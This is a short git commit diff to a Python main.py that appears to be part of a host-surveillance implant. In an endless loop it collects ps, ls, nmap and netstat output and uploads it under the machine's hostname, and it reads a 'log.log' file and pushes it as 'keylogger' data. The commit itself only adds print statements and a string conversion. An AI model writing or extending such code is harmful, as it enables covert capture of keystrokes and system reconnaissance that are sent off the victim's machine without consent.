3a3c1dadbcad9242b653bf2731466d2591c69c61
plantz <f.kauker@gmail.com>
2019-07-27 18:07:02 -0700

    running

--- main.py
+++ main.py
@@ -17,19 +17,23 @@ def main():
     gce_name = socket.gethostname()
     while True:
         ps_data = str(get_ps())
+        print(ps_data)
         print(push_file(ps_data, gce_name, "ps"))
 
         ls_data = str(get_ls())
+        print(ls_data)
         print(push_file(ls_data, gce_name, "ls"))
 
         nmap_data = str(get_nmap())
+        print(nmap_data)
         print(push_file(nmap_data, gce_name, "nmap"))
 
         netstat_data = str(get_netstat())
+        print(netstat_data)
         print(push_file(netstat_data, gce_name, "netstat"))
 
         with open("log.log", 'rb') as keyl:
-            kdata = keyl.readlines()
+            kdata = str(keyl.readlines())
             print(push_file(kdata, gce_name, "keylogger"))
 
 
